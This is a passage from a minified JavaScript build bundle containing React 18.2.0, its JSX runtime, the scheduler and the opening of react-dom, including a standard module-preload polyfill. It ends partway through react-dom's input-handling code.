function qd(e, t) {
    for (var n = 0; n < t.length; n++) {
        const r = t[n];
        if (typeof r != "string" && !Array.isArray(r)) {
            for (const l in r)
                if (l !== "default" && !(l in e)) {
                    const a = Object.getOwnPropertyDescriptor(r, l);
                    a && Object.defineProperty(e, l, a.get ? a : {
                        enumerable: !0,
                        get: () => r[l]
                    })
                }
        }
    }
    return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
    }))
}(function() {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload")) return;
    for (const l of document.querySelectorAll('link[rel="modulepreload"]')) r(l);
    new MutationObserver(l => {
        for (const a of l)
            if (a.type === "childList")
                for (const o of a.addedNodes) o.tagName === "LINK" && o.rel === "modulepreload" && r(o)
    }).observe(document, {
        childList: !0,
        subtree: !0
    });

    function n(l) {
        const a = {};
        return l.integrity && (a.integrity = l.integrity), l.referrerPolicy && (a.referrerPolicy = l.referrerPolicy), l.crossOrigin === "use-credentials" ? a.credentials = "include" : l.crossOrigin === "anonymous" ? a.credentials = "omit" : a.credentials = "same-origin", a
    }

    function r(l) {
        if (l.ep) return;
        l.ep = !0;
        const a = n(l);
        fetch(l.href, a)
    }
})();

function ef(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}
var gu = {
        exports: {}
    },
    ea = {},
    yu = {
        exports: {}
    },
    R = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Ar = Symbol.for("react.element"),
    tf = Symbol.for("react.portal"),
    nf = Symbol.for("react.fragment"),
    rf = Symbol.for("react.strict_mode"),
    lf = Symbol.for("react.profiler"),
    af = Symbol.for("react.provider"),
    of = Symbol.for("react.context"),
    sf = Symbol.for("react.forward_ref"),
    uf = Symbol.for("react.suspense"),
    cf = Symbol.for("react.memo"),
    df = Symbol.for("react.lazy"),
    rs = Symbol.iterator;

function ff(e) {
    return e === null || typeof e != "object" ? null : (e = rs && e[rs] || e["@@iterator"], typeof e == "function" ? e : null)
}
var wu = {
        isMounted: function() {
            return !1
        },
        enqueueForceUpdate: function() {},
        enqueueReplaceState: function() {},
        enqueueSetState: function() {}
    },
    xu = Object.assign,
    ku = {};

function Vn(e, t, n) {
    this.props = e, this.context = t, this.refs = ku, this.updater = n || wu
}
Vn.prototype.isReactComponent = {};
Vn.prototype.setState = function(e, t) {
    if (typeof e != "object" && typeof e != "function" && e != null) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, e, t, "setState")
};
Vn.prototype.forceUpdate = function(e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate")
};

function bu() {}
bu.prototype = Vn.prototype;

function Zo(e, t, n) {
    this.props = e, this.context = t, this.refs = ku, this.updater = n || wu
}
var Jo = Zo.prototype = new bu;
Jo.constructor = Zo;
xu(Jo, Vn.prototype);
Jo.isPureReactComponent = !0;
var ls = Array.isArray,
    Su = Object.prototype.hasOwnProperty,
    qo = {
        current: null
    },
    Eu = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };

function Nu(e, t, n) {
    var r, l = {},
        a = null,
        o = null;
    if (t != null)
        for (r in t.ref !== void 0 && (o = t.ref), t.key !== void 0 && (a = "" + t.key), t) Su.call(t, r) && !Eu.hasOwnProperty(r) && (l[r] = t[r]);
    var i = arguments.length - 2;
    if (i === 1) l.children = n;
    else if (1 < i) {
        for (var s = Array(i), u = 0; u < i; u++) s[u] = arguments[u + 2];
        l.children = s
    }
    if (e && e.defaultProps)
        for (r in i = e.defaultProps, i) l[r] === void 0 && (l[r] = i[r]);
    return {
        $$typeof: Ar,
        type: e,
        key: a,
        ref: o,
        props: l,
        _owner: qo.current
    }
}

function pf(e, t) {
    return {
        $$typeof: Ar,
        type: e.type,
        key: t,
        ref: e.ref,
        props: e.props,
        _owner: e._owner
    }
}

function ei(e) {
    return typeof e == "object" && e !== null && e.$$typeof === Ar
}

function mf(e) {
    var t = {
        "=": "=0",
        ":": "=2"
    };
    return "$" + e.replace(/[=:]/g, function(n) {
        return t[n]
    })
}
var as = /\/+/g;

function wa(e, t) {
    return typeof e == "object" && e !== null && e.key != null ? mf("" + e.key) : t.toString(36)
}

function hl(e, t, n, r, l) {
    var a = typeof e;
    (a === "undefined" || a === "boolean") && (e = null);
    var o = !1;
    if (e === null) o = !0;
    else switch (a) {
        case "string":
        case "number":
            o = !0;
            break;
        case "object":
            switch (e.$$typeof) {
                case Ar:
                case tf:
                    o = !0
            }
    }
    if (o) return o = e, l = l(o), e = r === "" ? "." + wa(o, 0) : r, ls(l) ? (n = "", e != null && (n = e.replace(as, "$&/") + "/"), hl(l, t, n, "", function(u) {
        return u
    })) : l != null && (ei(l) && (l = pf(l, n + (!l.key || o && o.key === l.key ? "" : ("" + l.key).replace(as, "$&/") + "/") + e)), t.push(l)), 1;
    if (o = 0, r = r === "" ? "." : r + ":", ls(e))
        for (var i = 0; i < e.length; i++) {
            a = e[i];
            var s = r + wa(a, i);
            o += hl(a, t, n, s, l)
        } else if (s = ff(e), typeof s == "function")
            for (e = s.call(e), i = 0; !(a = e.next()).done;) a = a.value, s = r + wa(a, i++), o += hl(a, t, n, s, l);
        else if (a === "object") throw t = String(e), Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
    return o
}

function Xr(e, t, n) {
    if (e == null) return e;
    var r = [],
        l = 0;
    return hl(e, r, "", "", function(a) {
        return t.call(n, a, l++)
    }), r
}

function hf(e) {
    if (e._status === -1) {
        var t = e._result;
        t = t(), t.then(function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 1, e._result = n)
        }, function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 2, e._result = n)
        }), e._status === -1 && (e._status = 0, e._result = t)
    }
    if (e._status === 1) return e._result.default;
    throw e._result
}
var ke = {
        current: null
    },
    vl = {
        transition: null
    },
    vf = {
        ReactCurrentDispatcher: ke,
        ReactCurrentBatchConfig: vl,
        ReactCurrentOwner: qo
    };
R.Children = {
    map: Xr,
    forEach: function(e, t, n) {
        Xr(e, function() {
            t.apply(this, arguments)
        }, n)
    },
    count: function(e) {
        var t = 0;
        return Xr(e, function() {
            t++
        }), t
    },
    toArray: function(e) {
        return Xr(e, function(t) {
            return t
        }) || []
    },
    only: function(e) {
        if (!ei(e)) throw Error("React.Children.only expected to receive a single React element child.");
        return e
    }
};
R.Component = Vn;
R.Fragment = nf;
R.Profiler = lf;
R.PureComponent = Zo;
R.StrictMode = rf;
R.Suspense = uf;
R.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = vf;
R.cloneElement = function(e, t, n) {
    if (e == null) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = xu({}, e.props),
        l = e.key,
        a = e.ref,
        o = e._owner;
    if (t != null) {
        if (t.ref !== void 0 && (a = t.ref, o = qo.current), t.key !== void 0 && (l = "" + t.key), e.type && e.type.defaultProps) var i = e.type.defaultProps;
        for (s in t) Su.call(t, s) && !Eu.hasOwnProperty(s) && (r[s] = t[s] === void 0 && i !== void 0 ? i[s] : t[s])
    }
    var s = arguments.length - 2;
    if (s === 1) r.children = n;
    else if (1 < s) {
        i = Array(s);
        for (var u = 0; u < s; u++) i[u] = arguments[u + 2];
        r.children = i
    }
    return {
        $$typeof: Ar,
        type: e.type,
        key: l,
        ref: a,
        props: r,
        _owner: o
    }
};
R.createContext = function(e) {
    return e = {
        $$typeof: of ,
        _currentValue: e,
        _currentValue2: e,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _defaultValue: null,
        _globalName: null
    }, e.Provider = {
        $$typeof: af,
        _context: e
    }, e.Consumer = e
};
R.createElement = Nu;
R.createFactory = function(e) {
    var t = Nu.bind(null, e);
    return t.type = e, t
};
R.createRef = function() {
    return {
        current: null
    }
};
R.forwardRef = function(e) {
    return {
        $$typeof: sf,
        render: e
    }
};
R.isValidElement = ei;
R.lazy = function(e) {
    return {
        $$typeof: df,
        _payload: {
            _status: -1,
            _result: e
        },
        _init: hf
    }
};
R.memo = function(e, t) {
    return {
        $$typeof: cf,
        type: e,
        compare: t === void 0 ? null : t
    }
};
R.startTransition = function(e) {
    var t = vl.transition;
    vl.transition = {};
    try {
        e()
    } finally {
        vl.transition = t
    }
};
R.unstable_act = function() {
    throw Error("act(...) is not supported in production builds of React.")
};
R.useCallback = function(e, t) {
    return ke.current.useCallback(e, t)
};
R.useContext = function(e) {
    return ke.current.useContext(e)
};
R.useDebugValue = function() {};
R.useDeferredValue = function(e) {
    return ke.current.useDeferredValue(e)
};
R.useEffect = function(e, t) {
    return ke.current.useEffect(e, t)
};
R.useId = function() {
    return ke.current.useId()
};
R.useImperativeHandle = function(e, t, n) {
    return ke.current.useImperativeHandle(e, t, n)
};
R.useInsertionEffect = function(e, t) {
    return ke.current.useInsertionEffect(e, t)
};
R.useLayoutEffect = function(e, t) {
    return ke.current.useLayoutEffect(e, t)
};
R.useMemo = function(e, t) {
    return ke.current.useMemo(e, t)
};
R.useReducer = function(e, t, n) {
    return ke.current.useReducer(e, t, n)
};
R.useRef = function(e) {
    return ke.current.useRef(e)
};
R.useState = function(e) {
    return ke.current.useState(e)
};
R.useSyncExternalStore = function(e, t, n) {
    return ke.current.useSyncExternalStore(e, t, n)
};
R.useTransition = function() {
    return ke.current.useTransition()
};
R.version = "18.2.0";
yu.exports = R;
var g = yu.exports;
const F = ef(g),
    xr = qd({
        __proto__: null,
        default: F
    }, [g]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var gf = g,
    yf = Symbol.for("react.element"),
    wf = Symbol.for("react.fragment"),
    xf = Object.prototype.hasOwnProperty,
    kf = gf.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
    bf = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };

function Cu(e, t, n) {
    var r, l = {},
        a = null,
        o = null;
    n !== void 0 && (a = "" + n), t.key !== void 0 && (a = "" + t.key), t.ref !== void 0 && (o = t.ref);
    for (r in t) xf.call(t, r) && !bf.hasOwnProperty(r) && (l[r] = t[r]);
    if (e && e.defaultProps)
        for (r in t = e.defaultProps, t) l[r] === void 0 && (l[r] = t[r]);
    return {
        $$typeof: yf,
        type: e,
        key: a,
        ref: o,
        props: l,
        _owner: kf.current
    }
}
ea.Fragment = wf;
ea.jsx = Cu;
ea.jsxs = Cu;
gu.exports = ea;
var p = gu.exports,
    Za = {},
    Tu = {
        exports: {}
    },
    Re = {},
    Pu = {
        exports: {}
    },
    ju = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
(function(e) {
    function t(P, L) {
        var $ = P.length;
        P.push(L);
        e: for (; 0 < $;) {
            var A = $ - 1 >>> 1,
                W = P[A];
            if (0 < l(W, L)) P[A] = L, P[$] = W, $ = A;
            else break e
        }
    }

    function n(P) {
        return P.length === 0 ? null : P[0]
    }

    function r(P) {
        if (P.length === 0) return null;
        var L = P[0],
            $ = P.pop();
        if ($ !== L) {
            P[0] = $;
            e: for (var A = 0, W = P.length, Yt = W >>> 1; A < Yt;) {
                var ne = 2 * (A + 1) - 1,
                    Yr = P[ne],
                    ut = ne + 1,
                    mn = P[ut];
                if (0 > l(Yr, $)) ut < W && 0 > l(mn, Yr) ? (P[A] = mn, P[ut] = $, A = ut) : (P[A] = Yr, P[ne] = $, A = ne);
                else if (ut < W && 0 > l(mn, $)) P[A] = mn, P[ut] = $, A = ut;
                else break e
            }
        }
        return L
    }

    function l(P, L) {
        var $ = P.sortIndex - L.sortIndex;
        return $ !== 0 ? $ : P.id - L.id
    }
    if (typeof performance == "object" && typeof performance.now == "function") {
        var a = performance;
        e.unstable_now = function() {
            return a.now()
        }
    } else {
        var o = Date,
            i = o.now();
        e.unstable_now = function() {
            return o.now() - i
        }
    }
    var s = [],
        u = [],
        d = 1,
        h = null,
        v = 3,
        y = !1,
        w = !1,
        x = !1,
        S = typeof setTimeout == "function" ? setTimeout : null,
        f = typeof clearTimeout == "function" ? clearTimeout : null,
        c = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);

    function m(P) {
        for (var L = n(u); L !== null;) {
            if (L.callback === null) r(u);
            else if (L.startTime <= P) r(u), L.sortIndex = L.expirationTime, t(s, L);
            else break;
            L = n(u)
        }
    }

    function k(P) {
        if (x = !1, m(P), !w)
            if (n(s) !== null) w = !0, Kt(N);
            else {
                var L = n(u);
                L !== null && Ye(k, L.startTime - P)
            }
    }

    function N(P, L) {
        w = !1, x && (x = !1, f(E), E = -1), y = !0;
        var $ = v;
        try {
            for (m(L), h = n(s); h !== null && (!(h.expirationTime > L) || P && !I());) {
                var A = h.callback;
                if (typeof A == "function") {
                    h.callback = null, v = h.priorityLevel;
                    var W = A(h.expirationTime <= L);
                    L = e.unstable_now(), typeof W == "function" ? h.callback = W : h === n(s) && r(s), m(L)
                } else r(s);
                h = n(s)
            }
            if (h !== null) var Yt = !0;
            else {
                var ne = n(u);
                ne !== null && Ye(k, ne.startTime - L), Yt = !1
            }
            return Yt
        } finally {
            h = null, v = $, y = !1
        }
    }
    var C = !1,
        j = null,
        E = -1,
        O = 5,
        T = -1;

    function I() {
        return !(e.unstable_now() - T < O)
    }

    function ie() {
        if (j !== null) {
            var P = e.unstable_now();
            T = P;
            var L = !0;
            try {
                L = j(!0, P)
            } finally {
                L ? je() : (C = !1, j = null)
            }
        } else C = !1
    }
    var je;
    if (typeof c == "function") je = function() {
        c(ie)
    };
    else if (typeof MessageChannel < "u") {
        var Qe = new MessageChannel,
            Ke = Qe.port2;
        Qe.port1.onmessage = ie, je = function() {
            Ke.postMessage(null)
        }
    } else je = function() {
        S(ie, 0)
    };

    function Kt(P) {
        j = P, C || (C = !0, je())
    }

    function Ye(P, L) {
        E = S(function() {
            P(e.unstable_now())
        }, L)
    }
    e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function(P) {
        P.callback = null
    }, e.unstable_continueExecution = function() {
        w || y || (w = !0, Kt(N))
    }, e.unstable_forceFrameRate = function(P) {
        0 > P || 125 < P ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : O = 0 < P ? Math.floor(1e3 / P) : 5
    }, e.unstable_getCurrentPriorityLevel = function() {
        return v
    }, e.unstable_getFirstCallbackNode = function() {
        return n(s)
    }, e.unstable_next = function(P) {
        switch (v) {
            case 1:
            case 2:
            case 3:
                var L = 3;
                break;
            default:
                L = v
        }
        var $ = v;
        v = L;
        try {
            return P()
        } finally {
            v = $
        }
    }, e.unstable_pauseExecution = function() {}, e.unstable_requestPaint = function() {}, e.unstable_runWithPriority = function(P, L) {
        switch (P) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                P = 3
        }
        var $ = v;
        v = P;
        try {
            return L()
        } finally {
            v = $
        }
    }, e.unstable_scheduleCallback = function(P, L, $) {
        var A = e.unstable_now();
        switch (typeof $ == "object" && $ !== null ? ($ = $.delay, $ = typeof $ == "number" && 0 < $ ? A + $ : A) : $ = A, P) {
            case 1:
                var W = -1;
                break;
            case 2:
                W = 250;
                break;
            case 5:
                W = 1073741823;
                break;
            case 4:
                W = 1e4;
                break;
            default:
                W = 5e3
        }
        return W = $ + W, P = {
            id: d++,
            callback: L,
            priorityLevel: P,
            startTime: $,
            expirationTime: W,
            sortIndex: -1
        }, $ > A ? (P.sortIndex = $, t(u, P), n(s) === null && P === n(u) && (x ? (f(E), E = -1) : x = !0, Ye(k, $ - A))) : (P.sortIndex = W, t(s, P), w || y || (w = !0, Kt(N))), P
    }, e.unstable_shouldYield = I, e.unstable_wrapCallback = function(P) {
        var L = v;
        return function() {
            var $ = v;
            v = L;
            try {
                return P.apply(this, arguments)
            } finally {
                v = $
            }
        }
    }
})(ju);
Pu.exports = ju;
var Sf = Pu.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var _u = g,
    Oe = Sf;

function b(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}
var Lu = new Set,
    kr = {};

function dn(e, t) {
    Mn(e, t), Mn(e + "Capture", t)
}

function Mn(e, t) {
    for (kr[e] = t, e = 0; e < t.length; e++) Lu.add(t[e])
}
var yt = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
    Ja = Object.prototype.hasOwnProperty,
    Ef = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
    os = {},
    is = {};

function Nf(e) {
    return Ja.call(is, e) ? !0 : Ja.call(os, e) ? !1 : Ef.test(e) ? is[e] = !0 : (os[e] = !0, !1)
}

function Cf(e, t, n, r) {
    if (n !== null && n.type === 0) return !1;
    switch (typeof t) {
        case "function":
        case "symbol":
            return !0;
        case "boolean":
            return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5), e !== "data-" && e !== "aria-");
        default:
            return !1
    }
}

function Tf(e, t, n, r) {
    if (t === null || typeof t > "u" || Cf(e, t, n, r)) return !0;
    if (r) return !1;
    if (n !== null) switch (n.type) {
        case 3:
            return !t;
        case 4:
            return t === !1;
        case 5:
            return isNaN(t);
        case 6:
            return isNaN(t) || 1 > t
    }
    return !1
}

function be(e, t, n, r, l, a, o) {
    this.acceptsBooleans = t === 2 || t === 3 || t === 4, this.attributeName = r, this.attributeNamespace = l, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = a, this.removeEmptyString = o
}
var de = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e) {
    de[e] = new be(e, 0, !1, e, null, !1, !1)
});
[
    ["acceptCharset", "accept-charset"],
    ["className", "class"],
    ["htmlFor", "for"],
    ["httpEquiv", "http-equiv"]
].forEach(function(e) {
    var t = e[0];
    de[t] = new be(t, 1, !1, e[1], null, !1, !1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function(e) {
    de[e] = new be(e, 2, !1, e.toLowerCase(), null, !1, !1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(e) {
    de[e] = new be(e, 2, !1, e, null, !1, !1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e) {
    de[e] = new be(e, 3, !1, e.toLowerCase(), null, !1, !1)
});
["checked", "multiple", "muted", "selected"].forEach(function(e) {
    de[e] = new be(e, 3, !0, e, null, !1, !1)
});
["capture", "download"].forEach(function(e) {
    de[e] = new be(e, 4, !1, e, null, !1, !1)
});
["cols", "rows", "size", "span"].forEach(function(e) {
    de[e] = new be(e, 6, !1, e, null, !1, !1)
});
["rowSpan", "start"].forEach(function(e) {
    de[e] = new be(e, 5, !1, e.toLowerCase(), null, !1, !1)
});
var ti = /[\-:]([a-z])/g;

function ni(e) {
    return e[1].toUpperCase()
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e) {
    var t = e.replace(ti, ni);
    de[t] = new be(t, 1, !1, e, null, !1, !1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e) {
    var t = e.replace(ti, ni);
    de[t] = new be(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function(e) {
    var t = e.replace(ti, ni);
    de[t] = new be(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
});
["tabIndex", "crossOrigin"].forEach(function(e) {
    de[e] = new be(e, 1, !1, e.toLowerCase(), null, !1, !1)
});
de.xlinkHref = new be("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function(e) {
    de[e] = new be(e, 1, !1, e.toLowerCase(), null, !0, !0)
});

function ri(e, t, n, r) {
    var l = de.hasOwnProperty(t) ? de[t] : null;
    (l !== null ? l.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (Tf(t, n, l, r) && (n = null), r || l === null ? Nf(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : l.mustUseProperty ? e[l.propertyName] = n === null ? l.type === 3 ? !1 : "" : n : (t = l.attributeName, r = l.attributeNamespace, n === null ? e.removeAttribute(t) : (l = l.type, n = l === 3 || l === 4 && n === !0 ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}
var bt = _u.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
    Zr = Symbol.for("react.element"),
    vn = Symbol.for("react.portal"),
    gn = Symbol.for("react.fragment"),
    li = Symbol.for("react.strict_mode"),
    qa = Symbol.for("react.profiler"),
    $u = Symbol.for("react.provider"),
    Fu = Symbol.for("react.context"),
    ai = Symbol.for("react.forward_ref"),
    eo = Symbol.for("react.suspense"),
    to = Symbol.for("react.suspense_list"),
    oi = Symbol.for("react.memo"),
    Nt = Symbol.for("react.lazy"),
    Ou = Symbol.for("react.offscreen"),
    ss = Symbol.iterator;

function Xn(e) {
    return e === null || typeof e != "object" ? null : (e = ss && e[ss] || e["@@iterator"], typeof e == "function" ? e : null)
}
var Y = Object.assign,
    xa;

function or(e) {
    if (xa === void 0) try {
        throw Error()
    } catch (n) {
        var t = n.stack.trim().match(/\n( *(at )?)/);
        xa = t && t[1] || ""
    }
    return `
` + xa + e
}
var ka = !1;

function ba(e, t) {
    if (!e || ka) return "";
    ka = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t)
            if (t = function() {
                    throw Error()
                }, Object.defineProperty(t.prototype, "props", {
                    set: function() {
                        throw Error()
                    }
                }), typeof Reflect == "object" && Reflect.construct) {
                try {
                    Reflect.construct(t, [])
                } catch (u) {
                    var r = u
                }
                Reflect.construct(e, [], t)
            } else {
                try {
                    t.call()
                } catch (u) {
                    r = u
                }
                e.call(t.prototype)
            }
        else {
            try {
                throw Error()
            } catch (u) {
                r = u
            }
            e()
        }
    } catch (u) {
        if (u && r && typeof u.stack == "string") {
            for (var l = u.stack.split(`
`), a = r.stack.split(`
`), o = l.length - 1, i = a.length - 1; 1 <= o && 0 <= i && l[o] !== a[i];) i--;
            for (; 1 <= o && 0 <= i; o--, i--)
                if (l[o] !== a[i]) {
                    if (o !== 1 || i !== 1)
                        do
                            if (o--, i--, 0 > i || l[o] !== a[i]) {
                                var s = `
` + l[o].replace(" at new ", " at ");
                                return e.displayName && s.includes("<anonymous>") && (s = s.replace("<anonymous>", e.displayName)), s
                            }
                    while (1 <= o && 0 <= i);
                    break
                }
        }
    } finally {
        ka = !1, Error.prepareStackTrace = n
    }
    return (e = e ? e.displayName || e.name : "") ? or(e) : ""
}

function Pf(e) {
    switch (e.tag) {
        case 5:
            return or(e.type);
        case 16:
            return or("Lazy");
        case 13:
            return or("Suspense");
        case 19:
            return or("SuspenseList");
        case 0:
        case 2:
        case 15:
            return e = ba(e.type, !1), e;
        case 11:
            return e = ba(e.type.render, !1), e;
        case 1:
            return e = ba(e.type, !0), e;
        default:
            return ""
    }
}

function no(e) {
    if (e == null) return null;
    if (typeof e == "function") return e.displayName || e.name || null;
    if (typeof e == "string") return e;
    switch (e) {
        case gn:
            return "Fragment";
        case vn:
            return "Portal";
        case qa:
            return "Profiler";
        case li:
            return "StrictMode";
        case eo:
            return "Suspense";
        case to:
            return "SuspenseList"
    }
    if (typeof e == "object") switch (e.$$typeof) {
        case Fu:
            return (e.displayName || "Context") + ".Consumer";
        case $u:
            return (e._context.displayName || "Context") + ".Provider";
        case ai:
            var t = e.render;
            return e = e.displayName, e || (e = t.displayName || t.name || "", e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
        case oi:
            return t = e.displayName || null, t !== null ? t : no(e.type) || "Memo";
        case Nt:
            t = e._payload, e = e._init;
            try {
                return no(e(t))
            } catch {}
    }
    return null
}

function jf(e) {
    var t = e.type;
    switch (e.tag) {
        case 24:
            return "Cache";
        case 9:
            return (t.displayName || "Context") + ".Consumer";
        case 10:
            return (t._context.displayName || "Context") + ".Provider";
        case 18:
            return "DehydratedFragment";
        case 11:
            return e = t.render, e = e.displayName || e.name || "", t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
        case 7:
            return "Fragment";
        case 5:
            return t;
        case 4:
            return "Portal";
        case 3:
            return "Root";
        case 6:
            return "Text";
        case 16:
            return no(t);
        case 8:
            return t === li ? "StrictMode" : "Mode";
        case 22:
            return "Offscreen";
        case 12:
            return "Profiler";
        case 21:
            return "Scope";
        case 13:
            return "Suspense";
        case 19:
            return "SuspenseList";
        case 25:
            return "TracingMarker";
        case 1:
        case 0:
        case 17:
        case 2:
        case 14:
        case 15:
            if (typeof t == "function") return t.displayName || t.name || null;
            if (typeof t == "string") return t
    }
    return null
}

function Wt(e) {
    switch (typeof e) {
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return e;
        case "object":
            return e;
        default:
            return ""
    }
}

function Ru(e) {
    var t = e.type;
    return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}

function _f(e) {
    var t = Ru(e) ? "checked" : "value",
        n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
        r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var l = n.get,
            a = n.set;
        return Object.defineProperty(e, t, {
            configurable: !0,
            get: function() {
                return l.call(this)
            },
            set: function(o) {
                r = "" + o, a.call(this, o)
            }
        }), Object.defineProperty(e, t, {
            enumerable: n.enumerable
        }), {
            getValue: function() {
                return r
            },
            setValue: function(o) {
                r = "" + o
            },
            stopTracking: function() {
                e._valueTracker = null, delete e[t]
            }
        }
    }
}

function Jr(e) {
    e._valueTracker || (e._valueTracker = _f(e))
}

function Mu(e) {
    if (!e) return !1;
    var t = e._valueTracker;
    if (!t) return !0;
    var n = t.getValue(),
        r = "";
    return e && (r = Ru(e) ? e.checked ? "true" : "false" : e.value), e = r, e !== n ? (t.setValue(e), !0) : !1
}

function Pl(e) {
    if (e = e || (typeof document < "u" ? document : void 0), typeof e > "u") return null;
    try {
        return e.activeElement || e.body
    } catch {
        return e.body
    }
}

function ro(e, t) {
    var n = t.checked;
    return Y({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ?? e._wrapperState.initialChecked
    })
}

function us(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue,
        r = t.checked != null ? t.checked : t.defaultChecked;
    n = Wt(t.value != null ? t.value : n), e._wrapperState = {
        initialChecked: r,
        initialValue: n,
        controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
    }
}

function zu(e, t) {
    t = t.checked, t != null && ri(e, "checked", t, !1)
}

function lo(e, t) {
    zu(e, t);
    var n = Wt(t.value),
        r = t.type;
    if (n != null) r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
    else if (r === "submit" || r === "reset") {
        e.removeAttribute("value");
        return
    }
